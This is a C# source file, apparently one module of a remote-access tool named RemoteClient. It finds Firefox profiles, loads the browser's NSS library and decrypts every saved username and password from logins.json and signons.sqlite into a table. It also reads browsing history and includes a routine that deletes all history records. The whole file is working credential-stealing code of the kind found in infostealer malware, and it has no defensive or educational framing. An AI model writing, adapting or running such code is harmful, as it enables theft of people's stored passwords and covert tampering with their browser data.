using RemoteClient.Browsers;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Data;
using System.Data.SQLite;
using System.Dynamic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace RemoteClient
{
    class Firefox
    {
        public List<Url> URLs { get; set; }
        private string error;

        public string getError()
        {
            return error;
        }

        public DataTable FetchCredentials()
        {
            try
            {
                DataTable dt = new DataTable();
                dt.Columns.Add("No");
                dt.Columns.Add("URL");
                dt.Columns.Add("Username");
                dt.Columns.Add("Password");

                FirefoxPassReader reader = new FirefoxPassReader();
                int count = 1;
                foreach (CredentialModel cr in reader.ReadPasswords())
                {
                    DataRow dr = dt.NewRow();
                    dr[0] = count.ToString();
                    dr[1] = cr.Url;
                    dr[2] = cr.Username;
                    dr[3] = cr.Password;

                    dt.Rows.Add(dr);
                    count++;
                }

                return dt;
            }
            catch(Exception ex)
            {
                error = ex.ToString();
                error = Marshal.GetLastWin32Error().ToString();
                return null;
            }
        }

        public DataTable GetHistory()
        {
            string documentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            documentsFolder += "\\Mozilla\\Firefox\\Profiles\\";

            if (Directory.Exists(documentsFolder))
            {
                foreach (string folder in Directory.GetDirectories(documentsFolder))
                {
                    return ExtractUserHistory(folder);
                }
            }
            return null;
        }


        DataTable ExtractUserHistory(string folder)
        {
            DataTable result = new DataTable();
            result.Columns.Add("Title");
            result.Columns.Add("URL");
            result.Columns.Add("Visit Date");

            DataTable historyDT = ExtractFromTable("moz_places", folder);
            DataTable visitsDT = ExtractFromTable("moz_historyvisits", folder);

            foreach (DataRow row in historyDT.Rows)
            {
                string date = Find(visitsDT, row["id"]);
                if (date != null)
                {
                    string url = row["Url"].ToString();
                    string title = row["title"].ToString();

                    result.Rows.Add(new string[] { title, url, FromUnixTime(long.Parse(date)).ToLongDateString() });
                }
                else
                {
                    string url = row["Url"].ToString();
                    string title = row["title"].ToString();
                    result.Rows.Add(new string[] { title, url, "NA" });
                }
            }

            return result;
        }

        public static DateTime FromUnixTime(long unixTime)
        {
            unixTime = unixTime / 1000000;
            var epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddSeconds(unixTime);
        }

        private string Find(DataTable visitsDT, object p)
        {
            string date = null;

            foreach (DataRow place in visitsDT.Rows)
            {
                if (place["id"].ToString() == p.ToString())
                {
                    date = place["visit_date"].ToString();
                    break;
                }
            }

            return date;
        }

        private void DeleteFromTable(string table, string folder)
        {
            SQLiteConnection sql_con;
            SQLiteCommand sql_cmd;
            string dbPath = folder + "\\places.sqlite";

            if (File.Exists(dbPath))
            {
                sql_con = new SQLiteConnection("Data Source=" + dbPath + ";Version=3;New=False;Compress=True;");
                sql_con.Open();
                string CommandText = "delete from " + table;

                sql_cmd = new SQLiteCommand(CommandText, sql_con);
                sql_cmd.ExecuteNonQuery();
                sql_con.Close();
            }
        }


        DataTable ExtractFromTable(string table, string folder)
        {
            SQLiteConnection sql_con;
            SQLiteCommand sql_cmd;
            SQLiteDataAdapter DB;
            DataTable DT = new DataTable();

            string dbPath = folder + "\\places.sqlite";

            if (File.Exists(dbPath))
            {            
                sql_con = new SQLiteConnection("Data Source=" + dbPath + ";Version=3;New=False;Compress=True;");

                sql_con.Open();
                sql_cmd = sql_con.CreateCommand();

                string CommandText = "select * from " + table;

                DB = new SQLiteDataAdapter(CommandText, sql_con);
                DB.Fill(DT);

                sql_con.Close();
            }

            return DT;
        }

        public bool ClearHistory()
        {
            try
            {
                string documentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                documentsFolder += "\\Mozilla\\Firefox\\Profiles\\";

                if (Directory.Exists(documentsFolder))
                {
                    foreach (string folder in Directory.GetDirectories(documentsFolder))
                    {
                        DeleteFromTable("moz_places", folder);
                        DeleteFromTable("moz_historyvisits", folder);
                    }
                    return true;
                }
                else return false;
            }
            catch(Exception ex)
            {
                RemoteClient.LogError(ex.ToString());
                return false;
            }
        }

        private static class FFDecryptor
        {
            [DllImport("kernel32.dll")]
            public static extern IntPtr LoadLibrary(string dllFilePath);

            static IntPtr NSS3;
            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate long DLLFunctionDelegate(string configdir);
            public static long NSS_Init(string configdir)
            {
                string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
                LoadLibrary(MozillaPath + "mozglue.dll");
                NSS3 = LoadLibrary(MozillaPath + "nss3.dll");
                IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
                DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
                return dll(configdir);
            }

            public static string Decrypt(string cypherText)
            {
                StringBuilder sb = new StringBuilder(cypherText);
                int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
                TSECItem tSecDec = new TSECItem();
                TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
                return null;
            }

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
            public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
            {
                IntPtr pProc = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
                DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
                return dll(arenaOpt, outItemOpt, inStr, inLen);
            }
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
            public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
            {
                IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
                DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
                return dll(ref data, ref result, cx);
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct TSECItem
            {
                public int SECItemType;
                public int SECItemData;
                public int SECItemLen;
            }
        }

        private class FirefoxPassReader : IPassReader
        {
            public string BrowserName { get { return "Firefox"; } }
            public IEnumerable<CredentialModel> ReadPasswords()
            {
                string signonsFile = null;
                string loginsFile = null;
                bool signonsFound = false;
                bool loginsFound = false;
                string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

                var logins = new List<CredentialModel>();
                if (dirs.Length == 0)
                    return logins;

                foreach (string dir in dirs)
                {
                    string[] files = Directory.GetFiles(dir, "signons.sqlite");
                    if (files.Length > 0)
                    {
                        signonsFile = files[0];
                        signonsFound = true;
                    }

                    // find &quot;logins.json"file
                    files = Directory.GetFiles(dir, "logins.json");
                    if (files.Length > 0)
                    {
                        loginsFile = files[0];
                        loginsFound = true;
                    }

                    if (loginsFound || signonsFound)
                    {
                        FFDecryptor.NSS_Init(dir);
                        break;
                    }

                }

                if (signonsFound)
                {
                    using (var conn = new SQLiteConnection("Data Source=" + signonsFile + ";"))
                    {
                        conn.Open();
                        using (var command = conn.CreateCommand())
                        {
                            command.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
                            using (var reader = command.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    string username = FFDecryptor.Decrypt(reader.GetString(0));
                                    string password = FFDecryptor.Decrypt(reader.GetString(1));

                                    logins.Add(new CredentialModel
                                    {
                                        Username = username,
                                        Password = password,
                                        Url = reader.GetString(2)
                                    });
                                }
                            }
                        }
                        conn.Close();
                    }

                }

                if (loginsFound)
                {
                    FFLogins ffLoginData;
                    using (StreamReader sr = new StreamReader(loginsFile))
                    {
                        string json = sr.ReadToEnd();

                        JavaScriptSerializer serializer = new JavaScriptSerializer();
                        serializer.RegisterConverters(new[] { new DynamicJsonConverter() });
                        ffLoginData = serializer.Deserialize<FFLogins>(json);
                    }

                    foreach (LoginData loginData in ffLoginData.logins)
                    {
                        string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                        string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
                        logins.Add(new CredentialModel
                        {
                            Username = username,
                            Password = password,
                            Url = loginData.hostname
                        });
                    }
                }
                return logins;
            }

            class FFLogins
            {
                public long nextId { get; set; }
                public LoginData[] logins { get; set; }
                public string[] disabledHosts { get; set; }
                public int version { get; set; }
            }

            class LoginData
            {
                public long id { get; set; }
                public string hostname { get; set; }
                public string url { get; set; }
                public string httprealm { get; set; }
                public string formSubmitURL { get; set; }
                public string usernameField { get; set; }
                public string passwordField { get; set; }
                public string encryptedUsername { get; set; }
                public string encryptedPassword { get; set; }
                public string guid { get; set; }
                public int encType { get; set; }
                public long timeCreated { get; set; }
                public long timeLastUsed { get; set; }
                public long timePasswordChanged { get; set; }
                public long timesUsed { get; set; }
            }
        }
    }

    public sealed class DynamicJsonConverter : JavaScriptConverter
    {
        public override object Deserialize(IDictionary<string, object> dictionary, Type type, JavaScriptSerializer serializer)
        {
            if (dictionary == null)
                throw new ArgumentNullException("dictionary");

            return type == typeof(object) ? new DynamicJsonObject(dictionary) : null;
        }

        public override IDictionary<string, object> Serialize(object obj, JavaScriptSerializer serializer)
        {
            throw new NotImplementedException();
        }

        public override IEnumerable<Type> SupportedTypes
        {
            get { return new ReadOnlyCollection<Type>(new List<Type>(new[] { typeof(object) })); }
        }

        #region Nested type: DynamicJsonObject

        private sealed class DynamicJsonObject : DynamicObject
        {
            private readonly IDictionary<string, object> _dictionary;

            public DynamicJsonObject(IDictionary<string, object> dictionary)
            {
                if (dictionary == null)
                    throw new ArgumentNullException("dictionary");
                _dictionary = dictionary;
            }

            public override string ToString()
            {
                var sb = new StringBuilder("{");
                ToString(sb);
                return sb.ToString();
            }

            private void ToString(StringBuilder sb)
            {
                var firstInDictionary = true;
                foreach (var pair in _dictionary)
                {
                    if (!firstInDictionary)
                        sb.Append(",");
                    firstInDictionary = false;
                    var value = pair.Value;
                    var name = pair.Key;
                    if (value is string)
                    {
                        sb.AppendFormat("{0}:\"{1}\"", name, value);
                    }
                    else if (value is IDictionary<string, object>)
                    {
                        new DynamicJsonObject((IDictionary<string, object>)value).ToString(sb);
                    }
                    else if (value is ArrayList)
                    {
                        sb.Append(name + ":[");
                        var firstInArray = true;
                        foreach (var arrayValue in (ArrayList)value)
                        {
                            if (!firstInArray)
                                sb.Append(",");
                            firstInArray = false;
                            if (arrayValue is IDictionary<string, object>)
                                new DynamicJsonObject((IDictionary<string, object>)arrayValue).ToString(sb);
                            else if (arrayValue is string)
                                sb.AppendFormat("\"{0}\"", arrayValue);
                            else
                                sb.AppendFormat("{0}", arrayValue);

                        }
                        sb.Append("]");
                    }
                    else
                    {
                        sb.AppendFormat("{0}:{1}", name, value);
                    }
                }
                sb.Append("}");
            }

            public override bool TryGetMember(GetMemberBinder binder, out object result)
            {
                if (!_dictionary.TryGetValue(binder.Name, out result))
                {
                    // return null to avoid exception.  caller can check for null this way...
                    result = null;
                    return true;
                }

                result = WrapResultObject(result);
                return true;
            }

            public override bool TryGetIndex(GetIndexBinder binder, object[] indexes, out object result)
            {
                if (indexes.Length == 1 && indexes[0] != null)
                {
                    if (!_dictionary.TryGetValue(indexes[0].ToString(), out result))
                    {
                        // return null to avoid exception.  caller can check for null this way...
                        result = null;
                        return true;
                    }

                    result = WrapResultObject(result);
                    return true;
                }

                return base.TryGetIndex(binder, indexes, out result);
            }

            private static object WrapResultObject(object result)
            {
                var dictionary = result as IDictionary<string, object>;
                if (dictionary != null)
                    return new DynamicJsonObject(dictionary);

                var arrayList = result as ArrayList;
                if (arrayList != null && arrayList.Count > 0)
                {
                    return arrayList[0] is IDictionary<string, object>
                        ? new List<object>(arrayList.Cast<IDictionary<string, object>>().Select(x => new DynamicJsonObject(x)))
                        : new List<object>(arrayList.Cast<object>());
                }

                return result;
            }
        }

        #endregion
    }
}
